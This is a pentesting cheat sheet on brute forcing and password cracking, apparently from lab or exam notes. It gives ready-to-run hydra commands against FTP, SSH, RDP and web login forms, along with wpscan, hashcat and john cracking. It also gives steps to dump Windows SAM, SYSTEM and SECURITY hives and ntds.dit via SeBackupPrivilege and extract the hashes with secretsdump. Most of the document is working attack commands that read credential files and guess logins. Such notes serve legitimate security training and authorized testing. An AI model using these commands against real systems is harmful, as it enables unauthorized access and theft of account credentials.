# Brute Forcing/Decrypting & Cracking 

**<u>Useful wordlists:</u>**

> /usr/share/wordlists/rockyou.txt
> /usr/share/wordlists/wfuzz/others/common_pass.txt
>
> In seclists-pkg:
>
> /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt
>  /usr/share/seclists/Passwords/Leaked-Databases/alleged-gmail-passwords.txt
>  /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

**<u>Creating a wordlist out of a website:</u>**

```bash
cewl http://10.11.1.39/otrs/index.pl -w passlist.txt
```

**<u>Hashcat Decrypting:</u>** (see https://hashcat.net/wiki/doku.php?id=example_hashes for hash codes)

```bash
hash-identifier

hashcat -m [id] -a 0 [hash] /usr/share/wordlists/rockyou.txt --force

hashcat -m 1000 -a 0 --quiet --potfile-disable local.hash /usr/share/wordlists/rockyou.txt 
```

**<u>FTP:</u>**

```bash
hydra -l [username] -P /usr/share/wordlists/rockyou.txt -f 192.168.52.103 ftp -V -s [port]
```

**<u>SSH/RDP:</u>**

```bash
hydra -V -f -l username -P /usr/share/wordlists/rockyou.txt  ssh://$ip

hydra -V -f -l username -P /usr/share/wordlists/rockyou.txt  rdp://$ip
```

**<u>Web post form:</u>**

```bash
hydra $ip http-post-form "/phpmyadmin/index.php:pma_username=^USER^&pma_password=^PASS^:#1045 Cannot log in to the MySQL server" -vV -l root -f -P /usr/share/wordlists/rockyou.txt  

hydra "http-post-form://10.11.1.222:8080/blog/adminlogin.jsp:username=admin&password=^PASS^:S=302" -l admin -P /usr/share/wordlists/fasttrack.txt -vV -f
```

**<u>Wordpress:</u>**

```bash
wpscan --url http://$ip/wp-login.php -U admin -P /usr/share/wordlists/rockyou.txt 
```

**<u>Cracking Linux Hashes:</u>**

With */etc/passwd/* & with */etc/shadow*

```bash
unshadow passwd-file.txt shadow-file.txt > unshadowed.txt
john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
```



**<u>Cracking Windows Hashes:</u>**

```bash
#must have admin priv
reg save hklm\sam .\sam
reg save hklm\system .\system
reg save hklm\security .\security

#transfer to kali then on kali:
secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
#OR
samdump2 System SAM
#----------------------------------------------------------------------------------
#using system.bak AND ntds.dit
reg save hklm\system c:\windows\temp\system.bak
#on PowerShell
Copy-FileSeBackupPrivilege e:\windows\ntds\ntds.dit c:\windows\temp\ntds.dit

#may need missing dlls: https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug
Import-Module .\SeBackupPrivilegeCmdLets.dll
Import-Module .\SeBackupPrivilegeUtils.dll

#on kali:
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -ntds ntds.dit -system system.bak LOCAL >> hashes.txt
```

